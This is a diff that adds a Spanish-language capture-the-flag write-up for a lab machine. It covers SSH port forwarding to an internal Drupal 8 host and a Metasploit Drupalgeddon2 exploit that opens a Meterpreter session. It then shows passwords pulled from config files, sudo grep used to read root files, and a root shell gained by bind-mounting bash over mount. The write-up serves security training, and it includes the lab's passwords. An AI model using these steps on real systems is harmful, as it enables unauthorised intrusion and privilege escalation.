@@ -274,3 +274,183 @@ El CTF presenta un entorno con:
 > **📝 Nota final**: Mantener el entorno organizado (`recon/`, `notes/`, etc.) es clave para CTFs complejos.
 ```
 
+[LUJO.md](https://github.com/user-attachments/files/29616980/LUJO.md)# Reporte de Auditoría: Pivoting, Explotación y Escalada de Privilegios
+
+## 1. Pivoting y Explotación Inicial
+
+### Reconocimiento Inicial
+El escaneo previo revela que el host interno **172.17.0.2** tiene el puerto **80/TCP** abierto, ejecutando un CMS **Drupal 8** vulnerable a **CVE-2018-7600** (*Drupalgeddon2*).
+
+### Configuración del Túnel (Local Port Forwarding)
+Para acceder al servicio web interno desde la máquina atacante, realizamos un reenvío de puertos local utilizando las credenciales comprometidas del usuario `Sophia` en la máquina puente (`IP`):
+
+```bash
+ssh -L 8080:172.17.0.2:80 Sophia@ip
+```
+*El servicio Drupal interno ahora está expuesto y es accesible localmente en `http://localhost:8080`.*
+<img width="1920" height="1006" alt="DRUPAL" src="https://github.com/user-attachments/assets/402d9458-af93-42ea-82fd-62db8b600c2a" />
+
+### Explotación con Metasploit
+Iniciamos el framework de Metasploit para explotar la vulnerabilidad detectada:
+
+```bash
+msfconsole
+```
+
+Dentro de la consola, configuramos y ejecutamos el módulo correspondiente:
+
+```msf
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS localhost
+set RPORT 8080
+run
+```
+
+**Salida del exploit:**
+```text
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP handler on 10.0.4.12:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Sending stage (41224 bytes) to ip
+[*] Meterpreter session 1 opened (ip:4444 -> 10.0.4.91:58680) 
+```
+
+Verificamos nuestra identidad dentro del contenedor:
+```text
+meterpreter > getuid
+Server username: www-data
+```
+*Éxito: Se ha obtenido una sesión de Meterpreter como el usuario de servicio `www-data`.*
+
+---
+
+## 2. Movimiento Lateral (Dentro del Contenedor)
+
+### Enumeración y Extracción de Credenciales
+Buscamos información sensible en los archivos de configuración del CMS:
+
+```bash
+grep -r "password" /var/www/html/sites/default/settings.php
+```
+
+**Resultado:**
+```php
+ * to replace the database username and password and possibly the host and port
+ * 'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
+```
+Se identifica la contraseña: `ballenitafeliz`.
+
+Tras revisar `/etc/passwd`, confirmamos la existencia de un usuario local llamado `ballenita`.
+
+### Tratamiento de la Shell y Cambio de Usuario
+Estabilizamos la terminal interactiva (*TTY*) y migramos a la cuenta del usuario hallado:
+
+```bash
+shell
+/bin/bash -i
+script -qc /bin/bash /dev/null 
+su ballenita
+```
+*(Introducir contraseña: `ballenitafeliz` cuando se solicite)*
+
+---
+
+## 3. Escalada de Privilegios (Dentro del Contenedor)
+
+### Enumeración de Permisos Sudo
+Verificamos los comandos que el usuario actual puede ejecutar con privilegios elevados:
+
+```bash
+sudo -l
+```
+
+**Resultado:**
+```text
+Matching Defaults entries for ballenita on 76f1a1515e36:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ballenita may run the following commands on 76f1a1515e36:
+    (root) NOPASSWD: /bin/ls, /bin/grep
+```
+El usuario puede ejecutar `/bin/ls` y `/bin/grep` como `root` sin requerir contraseña.
+
+### Exfiltración de Información del Host
+Utilizamos `ls` para inspeccionar el directorio del administrador:
+
+```bash
+sudo -u root /bin/ls -la /root
+```
+
+```text
+total 36
+...
+-rw-r--r-- 1 root root   secretitomaximo.txt
+```
+
+Leemos el contenido del archivo sensible usando `grep`:
+
+```bash
+sudo -u root /bin/grep '' /root/secretitomaximo.txt
+```
+
+**Contenido:**
+```text
+ElcipotedeChocolate-CipotitoCipoton
+```
+*Esta cadena expone la aparente contraseña del usuario `cipote` en el sistema operativo anfitrión.*
+
+---
+
+## 4. Escalada de Privilegios (Máquina Host)
+
+### Acceso al Sistema Anfitrión
+Cerramos la sesión actual dentro del contenedor y regresamos a nuestra máquina atacante para conectarnos directamente al host principal (`10.0.4.91`) vía SSH:
+
+```bash
+ssh cipote@10.0.4.91
+```
+*(Introducir contraseña obtenida: `ElcipotedeChocolate-CipotitoCipoton`)*
+
+### Análisis de Permisos Sudo
+Revisamos las capacidades normativas de sudo para el usuario actual en el host:
+
+```bash
+sudo -l
+```
+
+**Resultado:**
+```text
+Matching Defaults entries for cipote on TheHackersLabs-PaQueAigaLujo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:
+    (ALL) NOPASSWD: /usr/bin/mount
+```
+
+### Explotación de GTFOBins (Abuso de /usr/bin/mount)
+El binario `/usr/bin/mount` cuenta con privilegios de ejecución sin contraseña. Siguiendo las técnicas de **GTFOBins**, realizamos un montaje tipo *bind* de la shell funcional `/bin/bash` sobre el propio archivo binario `/bin/mount` para forzar su ejecución directa con máximos privilegios:
+
+```bash
+sudo /usr/bin/mount -o bind /bin/bash /bin/mount
+sudo mount
+```
+
+### Confirmación de Privilegios
+Validamos nuestra identidad en la nueva shell generada:
+
+```bash
+whoami
+```
+
+**Resultado:**
+```text
+root
+```
+
+**¡Compromiso Total del Host Completado con Éxito!**
+```text
+root@TheHackersLabs-PaQueAigaLujo:/home/cipote#
+```
+
